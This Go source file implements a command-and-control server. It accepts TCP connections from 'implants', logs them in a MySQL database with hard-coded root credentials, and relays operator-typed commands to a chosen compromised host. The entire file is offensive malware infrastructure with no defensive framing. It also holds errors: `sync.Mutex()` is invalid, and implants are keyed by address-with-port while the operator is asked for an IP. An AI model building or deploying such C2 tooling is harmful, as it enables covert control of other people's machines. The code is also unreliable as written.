package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"

	_ "github.com/go-sql-driver/mysql"
)

var implants = make(map[string]net.Conn)
var mutex = sync.Mutex()
var db *sql.DB

func main() {
	var err error
	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2db")
	if err != nil {
		panic(err)
	}
	defer db.Close()

	ln, err := net.Listen("tcp", ":5000")
	if err != nil {
		panic(err)
	}
	defer ln.Close()

	fmt.Println("[+] C2 Server running on port 5000...")
	go acceptConnections(ln)

	for {
		fmt.Print("C2> ")
		reader := bufio.NewReader(os.Stdin)
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "list" {
			listImplants()
		} else {
			fmt.Print("Enter implant IP: ")
			ip, _ := reader.ReadString('\n')
			sendCommand(strings.TrimSpace(ip), command)
		}
	}
}

func acceptConnections(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		addr := conn.RemoteAddr().String()
		mutex.Lock()
		implants[addr] = conn
		mutex.Unlock()
		fmt.Println("[+] Implant connected from", addr)

		_, _ = db.Exec("INSERT INTO implants (ip) VALUES (?) ON DUPLICATE KEY UPDATE last_seen = CURRENT_TIMESTAMP", addr)

		go handleConnection(conn, addr)
	}
}

func handleConnection(conn net.Conn, id string) {
	defer func() {
		mutex.Lock()
		delete(implants, id)
		mutex.Unlock()
		conn.Close()
	}()

	buffer := make([]byte, 4096)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("[-] Implant disconnected:", id)
			return
		}
		fmt.Printf("[+] Response from %s: %s\n", id, string(buffer[:n]))
	}
}

func listImplants() {
	rows, err := db.Query("SELECT id, ip, last_seen FROM implants")
	if err != nil {
		fmt.Println("[-] Database error")
		return
	}
	defer rows.Close()

	fmt.Println("[+] Active implants:")
	for rows.Next() {
		var id int
		var ip string
		var lastSeen string
		rows.Scan(&id, &ip, &lastSeen)
		fmt.Printf("   [%d] %s - Last Seen: %s\n", id, ip, lastSeen)
	}
}

func sendCommand(ip, command string) {
	mutex.Lock()
	conn, exists := implants[ip]
	mutex.Unlock()

	if !exists {
		fmt.Println("[-] Invalid implant IP")
		return
	}

	_, err := conn.Write([]byte(command))
	if err != nil {
		fmt.Println("[-] Failed to send command")
	}
}
